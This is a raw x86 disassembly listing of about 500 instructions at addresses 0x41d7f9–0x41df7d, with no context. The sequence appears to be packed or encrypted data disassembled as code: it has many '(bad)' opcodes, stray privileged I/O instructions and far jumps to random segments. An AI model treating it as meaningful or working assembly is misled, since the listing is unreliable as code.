  41d7f9:	adc    DWORD PTR [ecx-0x5c],0xffffffec
  41d7fd:	and    al,BYTE PTR [edx+0x7bf6afa4]
  41d803:	fisub  DWORD PTR [ebp-0x1d67d24e]
  41d809:	mov    ecx,0x8ca2c163
  41d80e:	mov    ch,0x65
  41d810:	xor    bl,BYTE PTR [edx-0x3d]
  41d813:	stos   DWORD PTR es:[edi],eax
  41d814:	fisub  DWORD PTR [eax+ebp*4-0x7d]
  41d818:	pop    esi
  41d819:	ret    
  41d81a:	aam    0x9a
  41d81c:	mov    BYTE PTR [ecx+0xe3b0395],cl
  41d822:	add    DWORD PTR [eax],ecx
  41d824:	pop    eax
  41d825:	aaa    
  41d826:	add    ch,BYTE PTR [ecx-0x7d]
  41d829:	dec    ebp
  41d82a:	xchg   ecx,eax
  41d82b:	sti    
  41d82c:	jge    0x41d7f4
  41d82e:	out    dx,eax
  41d82f:	sub    ebp,ecx
  41d831:	sub    al,BYTE PTR [ecx+0xd]
  41d834:	adc    ebx,ebp
  41d836:	add    al,0xad
  41d838:	sbb    edx,DWORD PTR [edx+ebx*1-0x1160dd46]
  41d83f:	stos   DWORD PTR es:[edi],eax
  41d840:	pushf  
  41d841:	dec    eax
  41d842:	pop    es
  41d843:	ret    
  41d844:	call   0xb276:0xadacc043
  41d84b:	scas   eax,DWORD PTR es:[edi]
  41d84c:	pop    edi
  41d84d:	cmc    
  41d84e:	arpl   di,bx
  41d850:	iret   
  41d851:	int3   
  41d852:	sti    
  41d853:	mov    dh,0x46
  41d855:	dec    ecx
  41d856:	sbb    DWORD PTR [ebx-0x76],ebp
  41d859:	and    al,0x2b
  41d85b:	dec    esp
  41d85c:	js     0x41d829
  41d85e:	push   ebx
  41d85f:	pop    eax
  41d860:	je     0x41d86e
  41d862:	inc    esp
  41d863:	cwde   
  41d864:	cmp    esp,eax
  41d866:	je     0x41d81c
  41d868:	cli    
  41d869:	fadd   DWORD PTR [edi-0x5c50f6c9]
  41d86f:	inc    ebx
  41d870:	fmul   QWORD PTR [esi+ecx*4+0xc8cfc2a]
  41d877:	pop    esi
  41d878:	mov    esi,0xea309fd4
  41d87d:	push   es
  41d87e:	popf   
  41d87f:	fwait
  41d880:	cs into 
  41d882:	out    0xac,al
  41d884:	shl    bh,cl
  41d886:	or     al,0x9
  41d888:	inc    eax
  41d889:	add    BYTE PTR [ebp+0x47],bh
  41d88c:	mov    al,ds:0xe105f708
  41d891:	and    al,0xb2
  41d893:	xor    DWORD PTR cs:[edx+0x785add08],ebp
  41d89a:	mov    esp,0x61862889
  41d89f:	xor    BYTE PTR [esi+0x73c20a52],dh
  41d8a5:	rcr    DWORD PTR [edi+0x2c598b],0x73
  41d8ac:	push   ds
  41d8ad:	push   es
  41d8ae:	dec    eax
  41d8af:	outs   dx,BYTE PTR ds:[esi]
  41d8b0:	fs add al,0x5
  41d8b3:	fmul   QWORD PTR [esi-0x13b87652]
  41d8b9:	outs   dx,DWORD PTR ds:[esi]
  41d8ba:	add    DWORD PTR [eax],ebp
  41d8bc:	ret    0x807
  41d8bf:	xor    BYTE PTR [ecx+0x29],bh
  41d8c2:	ds cdq 
  41d8c4:	xchg   ebp,eax
  41d8c5:	shr    DWORD PTR [ebx-0x51],cl
  41d8c8:	test   DWORD PTR [ebp+ecx*2+0x7],edx
  41d8cc:	jle    0x41d8e5
  41d8ce:	pop    edx
  41d8cf:	mov    ebx,0xe4991bd4
  41d8d4:	mov    bl,0xa0
  41d8d6:	aaa    
  41d8d7:	jne    0x41d8f1
  41d8d9:	adc    BYTE PTR [ebx],al
  41d8db:	cmp    BYTE PTR [edi-0x4a9a4e51],dh
  41d8e1:	shr    DWORD PTR [ebx-0x2e1b8419],1
  41d8e7:	and    ch,BYTE PTR [edx+0x4d]
  41d8ea:	test   DWORD PTR [ebp-0x16e37bf3],esp
  41d8f0:	leave  
  41d8f1:	es ss hlt 
  41d8f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d8f5:	imul   ebp,DWORD PTR [ecx],0xd036d54
  41d8fb:	push   edx
  41d8fc:	xor    ah,BYTE PTR [edi]
  41d8fe:	dec    esp
  41d8ff:	sub    ah,BYTE PTR [edx-0x2b]
  41d902:	sbb    cl,BYTE PTR [edx+0x47]
  41d905:	sub    edi,DWORD PTR [edi+0x3]
  41d908:	out    dx,eax
  41d909:	sub    ebx,ecx
  41d90b:	adc    dl,BYTE PTR [ecx+esi*4]
  41d90e:	sbb    DWORD PTR [esi],ebp
  41d910:	jg     0x41d89f
  41d912:	and    al,0x2b
  41d914:	push   ds
  41d915:	add    al,0xb5
  41d917:	pop    ds
  41d918:	sub    bl,cl
  41d91a:	outs   dx,BYTE PTR ds:[esi]
  41d91b:	repnz lods al,BYTE PTR ds:[esi]
  41d91d:	aam    0x37
  41d91f:	aaa    
  41d920:	scas   al,BYTE PTR es:[edi]
  41d921:	sbb    eax,0x3ad463c5
  41d926:	in     al,0x33
  41d928:	inc    ebx
  41d929:	in     eax,0x8a
  41d92b:	xchg   ebx,eax
  41d92d:	cwde   
  41d92e:	stos   BYTE PTR es:[edi],al
  41d92f:	imul   ecx,DWORD PTR [ebp+ebx*2+0x1b5bfe4f],0xffffffe7
  41d937:	gs jg  0x41d955
  41d93a:	ffreep st(1)
  41d93c:	jne    0x41d946
  41d93e:	shrd   esp,ebx,0xb5
  41d942:	xor    BYTE PTR [esi-0x3a44c959],dl
  41d948:	jl     0x41d900
  41d94a:	call   0x9477443e
  41d94f:	aam    0x96
  41d951:	fstp   st(7)
  41d953:	nop
  41d954:	sti    
  41d955:	jmp    0x79ed:0x8ed66428
  41d95c:	fistp  QWORD PTR es:[edx-0x42]
  41d960:	iret   
  41d961:	mov    al,0xbf
  41d963:	loop   0x41d95a
  41d965:	push   es
  41d966:	test   eax,0xef98a245
  41d96b:	inc    esp
  41d96c:	pop    esi
  41d96d:	add    ah,BYTE PTR [edi]
  41d96f:	dec    esp
  41d970:	xchg   ebx,eax
  41d971:	jb     0x41d9cd
  41d973:	adc    eax,0xc82a08cb
  41d978:	xchg   edx,eax
  41d979:	dec    edi
  41d97a:	lds    eax,FWORD PTR [esi+edi*8-0x6203964d]
  41d981:	lods   al,BYTE PTR ds:[esi]
  41d982:	imul   ecx,DWORD PTR [ecx-0x67],0xffffffe6
  41d986:	idiv   BYTE PTR [edi-0x4c8595d1]
  41d98c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d98d:	sub    bl,BYTE PTR [ebp-0x51]
  41d990:	(bad)  
  41d991:	bound  ebp,QWORD PTR [ecx+0x50509d42]
  41d997:	mov    esi,0x81cc84ca
  41d99c:	jo     0x41d9a9
  41d99e:	add    eax,DWORD PTR ds:0xfc67a68e
  41d9a4:	jae    0x41d9f7
  41d9a6:	or     esp,edi
  41d9a8:	cmp    BYTE PTR [ebp+0x6b67c2c7],dl
  41d9ae:	xor    dl,BYTE PTR [ecx-0x78]
  41d9b1:	(bad)  [eax-0x62]
  41d9b4:	in     al,0xed
  41d9b6:	call   0x1985:0x9ad6809f
  41d9bd:	femms  
  41d9bf:	add    al,0x6b
  41d9c1:	ja     0x41d9a8
  41d9c3:	(bad)  
  41d9c4:	ficom  DWORD PTR [ebp+eax*1-0x45960844]
  41d9cb:	fidivr DWORD PTR [esi-0xf]
  41d9ce:	call   0xca08:0xd6ee292a
  41d9d5:	(bad)  
  41d9d6:	sbb    ah,bl
  41d9d8:	(bad)  
  41d9d9:	out    dx,al
  41d9da:	jmp    0x41da26
  41d9dc:	das    
  41d9dd:	mov    eax,ds:0xffac23ae
  41d9e2:	cmp    cl,cl
  41d9e4:	xchg   esp,eax
  41d9e5:	push   ecx
  41d9e6:	mov    dl,0xa2
  41d9e8:	sub    cl,BYTE PTR [eax-0x31f89cfe]
  41d9ee:	xchg   edx,eax
  41d9ef:	int    0x3f
  41d9f1:	call   0xd8711a08
  41d9f6:	inc    ebx
  41d9f7:	ja     0x41da0f
  41d9f9:	arpl   WORD PTR [edx],di
  41d9fb:	daa    
  41d9fc:	sbb    dh,BYTE PTR [ebp+0x64]
  41d9ff:	test   bh,cl
  41da01:	sub    dh,bh
  41da03:	adc    eax,0x97c05f6e
  41da08:	cs in  eax,dx
  41da0a:	adc    dh,BYTE PTR [ebx]
  41da0c:	inc    eax
  41da0d:	fcmovnbe st,st(6)
  41da0f:	daa    
  41da10:	sub    edi,esi
  41da12:	xlat   BYTE PTR ds:[ebx]
  41da13:	jae    0x41d9c9
  41da15:	pop    ss
  41da16:	mov    ds:0x4d0bcaf8,eax
  41da1b:	push   edi
  41da1c:	ret    
  41da1d:	pop    ecx
  41da1e:	ror    DWORD PTR [ebx+0x3b714cd2],cl
  41da24:	bound  edi,QWORD PTR [edx+ebx*4+0x117a54d7]
  41da2b:	ret    
  41da2c:	xchg   ebp,eax
  41da2e:	dec    ebx
  41da2f:	push   edx
  41da30:	push   es
  41da31:	inc    eax
  41da32:	or     DWORD PTR [ebp-0x58],ebp
  41da35:	push   eax
  41da36:	lock sub al,0xcd
  41da39:	fnstsw WORD PTR ds:0xb3f7b2ab
  41da3f:	push   cs
  41da40:	pop    ebx
  41da41:	cmp    DWORD PTR [eax+0x35],esi
  41da44:	bound  esi,QWORD PTR [ebp+eax*4-0x608bdb91]
  41da4b:	mov    ch,0xb1
  41da4d:	int    0x17
  41da4f:	jl     0x41da2f
  41da51:	xchg   ebp,eax
  41da52:	xchg   ecx,eax
  41da53:	cld    
  41da54:	inc    ecx
  41da55:	cwde   
  41da56:	xor    dl,dl
  41da58:	fwait
  41da59:	scas   al,BYTE PTR es:[edi]
  41da5a:	push   edi
  41da5b:	rcl    DWORD PTR [ebp+0x200fefa8],0x22
  41da62:	out    0x5d,eax
  41da64:	sub    bh,BYTE PTR [esi]
  41da66:	cmc    
  41da67:	mov    dh,0xc7
  41da69:	inc    esp
  41da6a:	mov    ds:0x389f3731,al
  41da6f:	add    ebp,DWORD PTR [ebp+0x3225e342]
  41da75:	adc    BYTE PTR [edx+0x3c],0x57
  41da79:	push   ecx
  41da7a:	adc    ebp,DWORD PTR [edi-0x27a9b2a2]
  41da80:	stos   DWORD PTR es:[edi],eax
  41da81:	dec    edx
  41da82:	cli    
  41da83:	adc    DWORD PTR [edi],ebx
  41da85:	in     al,0x2b
  41da87:	jae    0x41db03
  41da89:	or     eax,eax
  41da8b:	rcr    BYTE PTR [ecx],0x24
  41da8e:	fbstp  TBYTE PTR [ebp-0x42]
  41da91:	mov    WORD PTR [edi],?
  41da93:	mov    DWORD PTR [esi-0x72],esp
  41da96:	xchg   edx,eax
  41da97:	std    
  41da98:	lods   eax,DWORD PTR ds:[esi]
  41da99:	inc    edi
  41da9a:	shr    bh,0x46
  41da9d:	stos   DWORD PTR es:[edi],eax
  41da9e:	mov    bl,0x19
  41daa0:	test   eax,0x1c211ee4
  41daa5:	retf   
  41daa6:	xchg   edi,eax
  41daa7:	test   DWORD PTR [ebp-0x21661142],edx
  41daad:	mov    es,WORD PTR [esi+0x3e3e76ae]
  41dab3:	call   0x909345d1
  41dab8:	xchg   esp,eax
  41dab9:	mov    ah,0x18
  41dabb:	repz mov ebx,0xc23339a3
  41dac1:	adc    ecx,DWORD PTR [ebp+0x70]
  41dac4:	jns    0x41dab3
  41dac6:	or     DWORD PTR [edx+0x743ba522],0x3c1bee95
  41dad0:	aaa    
  41dad1:	adc    eax,0x1f6304a2
  41dad6:	adc    eax,0x4b0bb3b0
  41dadb:	xor    DWORD PTR [ebx+edx*8-0x3e],esp
  41dadf:	(bad)  
  41dae0:	xchg   edi,eax
  41dae1:	sub    eax,0x4922d6df
  41dae6:	mov    al,ds:0x676e09c5
  41daeb:	xchg   edx,eax
  41daec:	and    BYTE PTR [edx+0x48],cl
  41daef:	inc    esp
  41daf0:	mov    ah,0x6d
  41daf2:	mov    edx,0x9af17d58
  41daf7:	dec    edi
  41daf8:	shl    DWORD PTR [eax],0xe6
  41dafb:	sbb    dh,BYTE PTR [edi+0x7a1d1864]
  41db01:	cmc    
  41db02:	dec    esi
  41db03:	xor    eax,DWORD PTR [ebx+0xd9a31ba]
  41db09:	pop    es
  41db0a:	ret    
  41db0b:	jbe    0x41dad2
  41db0d:	jmp    0x2b75:0x1e1c90f3
  41db14:	mov    BYTE PTR [esi+0x79],dh
  41db17:	out    dx,eax
  41db18:	(bad)  
  41db19:	fbstp  TBYTE PTR [esi]
  41db1b:	xchg   esi,eax
  41db1c:	ret    
  41db1d:	fisttp DWORD PTR [ecx*4-0x33292454]
  41db24:	push   esi
  41db25:	rol    BYTE PTR [eax-0x31cdbcae],0xc
  41db2c:	xchg   edi,eax
  41db2d:	dec    ebp
  41db2e:	shl    bl,0x2d
  41db31:	jg     0x41db3f
  41db33:	int3   
  41db34:	inc    esi
  41db35:	aas    
  41db36:	sub    al,0xb6
  41db38:	inc    edx
  41db39:	out    dx,eax
  41db3a:	cmc    
  41db3b:	mov    es:0xbd3e3e68,al
  41db41:	xchg   ecx,eax
  41db42:	stos   DWORD PTR es:[edi],eax
  41db43:	push   edi
  41db44:	adc    ecx,DWORD PTR [edx]
  41db46:	push   0x4b
  41db48:	dec    esp
  41db49:	mov    cs,WORD PTR [esi+edi*8-0x1a]
  41db4d:	pusha  
  41db4e:	clc    
  41db4f:	call   0x8860:0xf31316c5
  41db56:	js     0x41db07
  41db58:	test   BYTE PTR [eax-0x4713124f],ah
  41db5e:	push   cs
  41db5f:	jne    0x41daf6
  41db61:	mov    ah,BYTE PTR [edi-0x15ac5b3f]
  41db67:	je     0x41dbaf
  41db69:	mov    es,esp
  41db6b:	(bad)  
  41db6c:	in     al,0xee
  41db6e:	mov    edi,0x3de4b7b3
  41db73:	outs   dx,DWORD PTR ds:[esi]
  41db74:	clc    
  41db75:	scas   eax,DWORD PTR es:[edi]
  41db76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41db77:	loop   0x41dba2
  41db79:	scas   eax,DWORD PTR es:[edi]
  41db7a:	std    
  41db7b:	fwait
  41db7c:	or     cl,al
  41db7e:	clc    
  41db7f:	aaa    
  41db80:	inc    edx
  41db81:	xchg   edx,eax
  41db82:	mov    edx,0x43355972
  41db87:	scas   eax,DWORD PTR es:[edi]
  41db88:	into   
  41db89:	je     0x41dbf8
  41db8b:	dec    eax
  41db8c:	int    0x2a
  41db8e:	les    eax,FWORD PTR [edx-0x2]
  41db91:	fld    DWORD PTR [eax]
  41db93:	sbb    edx,DWORD PTR [ecx+0x79aa3276]
  41db99:	push   esp
  41db9a:	pop    esi
  41db9b:	sbb    eax,0xb6bf14e
  41dba0:	mov    al,ds:0x4e1e231b
  41dba5:	fild   DWORD PTR [eax+0x5b3a8cde]
  41dbab:	into   
  41dbac:	pop    esp
  41dbad:	inc    edx
  41dbae:	sbb    dh,cl
  41dbb0:	call   0x56667b0c
  41dbb5:	mov    edi,0x4ccb2b66
  41dbba:	jl     0x41dc1c
  41dbbc:	(bad)  
  41dbbd:	cli    
  41dbbe:	jle    0x41db9e
  41dbc0:	pop    esp
  41dbc1:	mov    edi,0xce2c2d0
  41dbc6:	inc    ecx
  41dbc7:	xchg   edi,eax
  41dbc8:	ret    
  41dbc9:	mov    ecx,0x86b00249
  41dbce:	sbb    al,0x40
  41dbd0:	mov    edx,0xb2461244
  41dbd5:	fisttp WORD PTR [edi-0x564f53ce]
  41dbdb:	out    0x67,al
  41dbdd:	dec    edx
  41dbde:	pop    esi
  41dbdf:	and    ah,BYTE PTR [ebx+0x77b01251]
  41dbe5:	jg     0x41dbbf
  41dbe7:	lods   eax,DWORD PTR ds:[esi]
  41dbe8:	push   ebx
  41dbe9:	mov    bh,0x2f
  41dbeb:	fwait
  41dbec:	cmp    ch,BYTE PTR [ecx]
  41dbee:	and    eax,0x4bea6b95
  41dbf3:	into   
  41dbf4:	les    esi,FWORD PTR [ebx-0x71959a15]
  41dbfa:	ror    bl,cl
  41dbfc:	(bad)  
  41dbfd:	nop
  41dbfe:	data16 jno 0x41dc22
  41dc01:	pop    eax
  41dc02:	loopne 0x41dc2b
  41dc04:	mov    ds:0x92e9f6b3,al
  41dc09:	push   0xffffffed
  41dc0b:	xchg   esp,eax
  41dc0c:	lahf   
  41dc0d:	daa    
  41dc0e:	push   ebp
  41dc0f:	repnz and BYTE PTR [eax],0x25
  41dc13:	retf   0x4b58
  41dc16:	cs int3 
  41dc18:	jg     0x41dbcf
  41dc1a:	ret    
  41dc1b:	in     eax,dx
  41dc1c:	and    ecx,DWORD PTR [eax]
  41dc1e:	test   DWORD PTR [ebx+0xc298c05],esi
  41dc24:	lds    edx,FWORD PTR ds:0x8fc3ef90
  41dc2a:	sbb    eax,0xd94a4d93
  41dc2f:	and    edx,DWORD PTR [ebx-0x54]
  41dc32:	pushf  
  41dc33:	fdivr  DWORD PTR [ecx]
  41dc35:	outs   dx,BYTE PTR ds:[esi]
  41dc36:	(bad)  
  41dc37:	out    dx,eax
  41dc38:	add    BYTE PTR [esi],ch
  41dc3a:	fdivr  st(0),st
  41dc3c:	sbb    al,0xfd
  41dc3e:	nop
  41dc3f:	mov    al,ds:0x527d9ad5
  41dc44:	mov    esp,0x9a7e82f4
  41dc49:	rcr    DWORD PTR [edi+0x43],1
  41dc4c:	loope  0x41dbcf
  41dc4e:	mov    ebp,edi
  41dc50:	sbb    eax,0x16a01c25
  41dc55:	(bad)  
  41dc56:	xchg   ebp,eax
  41dc57:	adc    al,0x67
  41dc59:	xlat   BYTE PTR ds:[ebx]
  41dc5a:	fistp  WORD PTR [edi+0x2dde3465]
  41dc60:	inc    esp
  41dc61:	hlt    
  41dc62:	xchg   BYTE PTR [ecx+0x2d],al
  41dc65:	call   0x7d8a:0xe2a595f3
  41dc6c:	pop    ecx
  41dc6d:	jo     0x41dc13
  41dc6f:	add    ecx,ecx
  41dc71:	loopne 0x41dc0f
  41dc73:	pushf  
  41dc74:	cmc    
  41dc75:	data16 mov ds:0x564f7f79,al
  41dc7b:	in     al,dx
  41dc7c:	mov    edx,0x7fb7f962
  41dc81:	jb     0x41dcf9
  41dc83:	add    BYTE PTR [ecx-0x75],0x97
  41dc87:	jmp    0x6643ba5
  41dc8c:	scas   eax,DWORD PTR es:[edi]
  41dc8d:	mov    es,WORD PTR [eax]
  41dc8f:	ffreep st(2)
  41dc91:	test   DWORD PTR [eax],ebp
  41dc93:	pusha  
  41dc94:	int    0x36
  41dc96:	add    BYTE PTR [edi+esi*1+0x73],ch
  41dc9a:	inc    BYTE PTR [edx+0x12]
  41dc9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dc9e:	jp     0x41dcd3
  41dca0:	js     0x41dce6
  41dca2:	retf   
  41dca3:	sbb    eax,DWORD PTR [ebx+0x65cf34bc]
  41dca9:	pop    ebx
  41dcaa:	add    ecx,eax
  41dcac:	out    dx,eax
  41dcad:	add    eax,edi
  41dcaf:	and    dh,BYTE PTR [eax-0x94c385c]
  41dcb5:	jo     0x41dca2
  41dcb7:	mov    ebp,0x9b35843
  41dcbc:	inc    ecx
  41dcbd:	out    0x5c,al
  41dcbf:	sahf   
  41dcc0:	xchg   esi,eax
  41dcc1:	int3   
  41dcc2:	pop    ds
  41dcc3:	leave  
  41dcc4:	or     bh,BYTE PTR ds:0x973e22b0
  41dcca:	jmp    0x833a:0x2571fb84
  41dcd1:	adc    al,0xa1
  41dcd3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dcd4:	mov    dh,0xa1
  41dcd6:	daa    
  41dcd7:	enter  0x2046,0x2b
  41dcdb:	cmp    al,0x81
  41dcdd:	mov    cl,0x4e
  41dcdf:	ins    BYTE PTR es:[edi],dx
  41dce0:	lods   eax,DWORD PTR ds:[esi]
  41dce1:	ss aam 0xc2
  41dce4:	ss sahf 
  41dce6:	pop    esi
  41dce7:	or     ebp,eax
  41dce9:	mov    al,ds:0x89394de7
  41dcee:	cdq    
  41dcef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dcf0:	xchg   ecx,eax
  41dcf1:	xor    DWORD PTR [ecx],ebp
  41dcf3:	(bad)  
  41dcf4:	lock dec ebx
  41dcf6:	pop    edi
  41dcf7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dcf8:	sbb    eax,DWORD PTR [ebx+0x17a41def]
  41dcfe:	(bad)  
  41dcff:	mov    ch,0x2d
  41dd01:	mov    dh,BYTE PTR [edx]
  41dd03:	push   edx
  41dd04:	push   ds
  41dd05:	sub    BYTE PTR [edx],dh
  41dd07:	bound  esp,QWORD PTR [edi+0x31fa73f4]
  41dd0d:	rcr    BYTE PTR ds:[eax+esi*2+0x35a8e324],1
  41dd15:	xor    ecx,edx
  41dd17:	das    
  41dd18:	pop    ebx
  41dd19:	mov    esp,ebx
  41dd1b:	in     al,0x99
  41dd1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dd1e:	std    
  41dd1f:	dec    ebx
  41dd20:	push   ecx
  41dd21:	hlt    
  41dd22:	xchg   edx,eax
  41dd23:	jmp    0x41dd36
  41dd25:	popa   
  41dd26:	lea    esp,[edx+0x36bae1bd]
  41dd2c:	ja     0x41dd77
  41dd2e:	add    al,0x5f
  41dd30:	xor    eax,0xbf6c65b1
  41dd35:	sub    BYTE PTR ds:0x92bdd8ca,0x2c
  41dd3c:	inc    esp
  41dd3d:	mov    ds:0x8a9e0c33,al
  41dd42:	or     ebp,DWORD PTR [ecx-0x20]
  41dd45:	cdq    
  41dd46:	out    0x2d,al
  41dd48:	(bad)  
  41dd49:	fadd   DWORD PTR [ecx]
  41dd4b:	ja     0x41dd3d
  41dd4d:	lahf   
  41dd4e:	into   
  41dd4f:	ins    DWORD PTR es:[edi],dx
  41dd50:	pop    ecx
  41dd51:	mov    ds:0x90e10ac3,al
  41dd56:	das    
  41dd57:	or     ch,al
  41dd59:	dec    edx
  41dd5a:	xchg   ch,al
  41dd5c:	retf   0xe9ee
  41dd5f:	jns    0x41dd0d
  41dd61:	ins    DWORD PTR es:[edi],dx
  41dd62:	sbb    al,0x76
  41dd64:	mov    dl,0x1d
  41dd66:	ja     0x41dd14
  41dd68:	aad    0x8d
  41dd6a:	jp     0x41ddae
  41dd6c:	and    esi,DWORD PTR [ebp+edi*2+0x19351c56]
  41dd73:	fimul  WORD PTR [esi+edx*8]
  41dd76:	repnz adc al,0xca
  41dd79:	cmc    
  41dd7a:	(bad)  
  41dd7b:	hlt    
  41dd7c:	imul   ecx,DWORD PTR [edx-0x2f88563c],0xeea5f6c6
  41dd86:	add    bl,cl
  41dd88:	push   0xffffff8a
  41dd8a:	dec    edx
  41dd8b:	sahf   
  41dd8c:	rol    edi,cl
  41dd8e:	sar    DWORD PTR ds:0x146e832b,0xd6
  41dd95:	fcomi  st,st(6)
  41dd97:	pop    ebx
  41dd98:	mov    ebx,0xd166cc1e
  41dd9d:	xor    al,0x16
  41dd9f:	(bad)  
  41dda0:	jg     0x41ddbd
  41dda2:	push   0xf7015255
  41dda7:	pop    es
  41dda8:	cmp    DWORD PTR [ecx-0x4941d2fc],edi
  41ddae:	lods   al,BYTE PTR ds:[esi]
  41ddaf:	pushf  
  41ddb0:	ret    
  41ddb1:	enter  0x2d49,0x5e
  41ddb5:	pop    ebx
  41ddb6:	push   cs
  41ddb7:	jns    0x41dda2
  41ddb9:	jge    0x41dd50
  41ddbb:	add    al,0x7a
  41ddbd:	stc    
  41ddbe:	dec    esp
  41ddbf:	sbb    BYTE PTR ds:0x601521c3,bl
  41ddc5:	mov    bh,0x20
  41ddc7:	add    eax,0xc45153f
  41ddcc:	stc    
  41ddcd:	jmp    0xc3380ca3
  41ddd2:	pop    es
  41ddd3:	sbb    DWORD PTR [ecx+edx*8-0x776567a3],edi
  41ddda:	pop    esi
  41dddb:	cwde   
  41dddc:	and    BYTE PTR es:0xbac4261a,al
  41dde3:	push   cs
  41dde4:	into   
  41dde5:	je     0x41dd91
  41dde7:	pop    ecx
  41dde8:	mov    eax,0x706e3537
  41dded:	jbe    0x41de2e
  41ddef:	xor    esi,DWORD PTR [ebp+0x1b20c5eb]
  41ddf5:	and    BYTE PTR [ecx],dh
  41ddf7:	(bad)  
  41ddf8:	cld    
  41ddf9:	imul   ecx,ecx,0xd767b3c7
  41ddff:	add    DWORD PTR [ebp-0x55],0xffffffe0
  41de03:	or     al,cl
  41de05:	add    DWORD PTR [ebx+0x4aa2b2e0],edi
  41de0b:	fcmovu st,st(4)
  41de0d:	outs   dx,BYTE PTR ds:[esi]
  41de0e:	(bad)  
  41de0f:	mov    esi,0x8bae30ff
  41de14:	add    DWORD PTR [ebx+esi*2-0x20],0xe163dcf4
  41de1c:	test   eax,0xbfaf4cb4
  41de21:	add    al,BYTE PTR [edi]
  41de23:	mov    ebx,0x365825e8
  41de28:	sub    DWORD PTR [ebp-0x1a712c82],ebx
  41de2e:	test   al,0x45
  41de30:	add    ebp,DWORD PTR [eax-0x26]
  41de33:	add    eax,0xd6d7de14
  41de38:	out    dx,eax
  41de39:	out    0x15,al
  41de3b:	addr16 dec edx
  41de3d:	mov    ds,ecx
  41de3f:	cmp    eax,0x67e10f33
  41de44:	mov    cl,0xda
  41de46:	mov    ah,0x55
  41de49:	cld    
  41de4a:	loop   0x41ddce
  41de4c:	sbb    esi,DWORD PTR [edi+ebp*4]
  41de4f:	fsubr  QWORD PTR [ebx]
  41de51:	and    bh,BYTE PTR [edi]
  41de53:	sbb    eax,0x6e85e589
  41de58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41de59:	xchg   DWORD PTR [ebx+0x781bb3fe],ebx
  41de5f:	dec    ebp
  41de60:	mov    ebx,0xfb828846
  41de65:	jb     0x41ddea
  41de67:	inc    eax
  41de68:	jg     0x41de24
  41de6a:	mov    eax,0xd8a26533
  41de6f:	or     dh,dl
  41de71:	mov    WORD PTR [ebx-0x7b],gs
  41de74:	or     DWORD PTR [esi+0x1a196ea3],ecx
  41de7a:	hlt    
  41de7b:	les    esi,FWORD PTR [ecx]
  41de7d:	cmp    DWORD PTR [ecx+0x5],ebx
  41de80:	mov    esi,0x37390a74
  41de85:	adc    eax,DWORD PTR ds:0xb111c6f2
  41de8b:	scas   al,BYTE PTR es:[edi]
  41de8c:	pop    ebx
  41de8d:	ret    
  41de8e:	mov    eax,0xc876c77c
  41de93:	cmp    al,BYTE PTR [ecx+0x66fad210]
  41de99:	mov    al,0x93
  41de9b:	push   0x3f6722a9
  41dea0:	adc    DWORD PTR [ebx],eax
  41dea2:	sub    BYTE PTR [esi+0x4117b8b3],dh
  41dea8:	retf   
  41dea9:	mov    ebx,0x99f3274c
  41deae:	and    BYTE PTR ds:0xa9ec23f2,cl
  41deb4:	mov    ch,0x62
  41deb6:	out    0xdb,al
  41deb8:	sub    DWORD PTR [ecx],0x5c00c695
  41debe:	sahf   
  41debf:	aas    
  41dec0:	xor    ebx,DWORD PTR [ecx]
  41dec2:	sbb    DWORD PTR [edx-0x4f880533],edx
  41dec8:	repz add DWORD PTR [esi],ebx
  41decb:	cmp    edi,DWORD PTR [edi-0x4218f0c3]
  41ded1:	jge    0x41def0
  41ded3:	jb     0x41de92
  41ded5:	jecxz  0x41df4a
  41ded7:	ss mov esi,0x148d8011
  41dedd:	jecxz  0x41deff
  41dedf:	int3   
  41dee0:	xor    al,0xf5
  41dee2:	mov    ch,0x9f
  41dee4:	jb     0x41df35
  41dee6:	jb     0x41df53
  41dee8:	ret    
  41dee9:	add    BYTE PTR [ebx+edi*1-0x2a],bh
  41deed:	std    
  41deee:	or     al,0x52
  41def0:	dec    esi
  41def1:	ins    BYTE PTR es:[edi],dx
  41def2:	mov    cl,0x57
  41def4:	or     BYTE PTR [esi-0x30],bl
  41def7:	repnz pop eax
  41def9:	popf   
  41defa:	imul   esi,DWORD PTR [eax+ebx*4],0xffffff8a
  41defe:	mov    BYTE PTR [edx+0x58dd6d10],bl
  41df04:	sbb    BYTE PTR [edi-0x4148b116],bl
  41df0a:	jle    0x41df26
  41df0c:	into   
  41df0d:	jp     0x41deec
  41df0f:	xchg   ebx,eax
  41df10:	adc    eax,0xa719e085
  41df15:	mov    dh,0xf2
  41df17:	iret   
  41df18:	les    esi,FWORD PTR ds:0x986df583
  41df1e:	es mov ecx,0x6bcf0ddf
  41df24:	or     ebp,edi
  41df26:	aad    0xf8
  41df28:	sbb    al,0x5b
  41df2a:	out    0x58,eax
  41df2c:	fwait
  41df2d:	test   al,0x6f
  41df2f:	push   edi
  41df30:	call   0x7535ec96
  41df35:	stos   DWORD PTR es:[edi],eax
  41df36:	xchg   edi,eax
  41df37:	out    dx,al
  41df38:	inc    DWORD PTR [ebp+0x5ee2c785]
  41df3e:	inc    esp
  41df3f:	inc    esp
  41df40:	jle    0x41df6c
  41df42:	outs   dx,DWORD PTR ds:[esi]
  41df43:	imul   BYTE PTR ds:0xdb922a77
  41df49:	dec    ebp
  41df4a:	loopne 0x41df59
  41df4c:	xor    al,0xcc
  41df4e:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  41df50:	mov    ecx,0x74d990f9
  41df55:	xchg   esi,eax
  41df56:	cmc    
  41df57:	cwde   
  41df58:	sbb    al,0x5c
  41df5a:	ret    0x4839
  41df5d:	cmp    ecx,DWORD PTR [edx+0x3de97bce]
  41df63:	fnsave [eax-0x35]
  41df66:	arpl   WORD PTR [ebx+0x7dd27fed],bx
  41df6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41df6d:	retf   
  41df6e:	cs (bad) 
  41df71:	hlt    
  41df72:	fwait
  41df73:	test   dl,0xa3
  41df76:	push   0x7e
  41df78:	enter  0x9d33,0x79
  41df7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41df7d:	adc    ebp,ebp
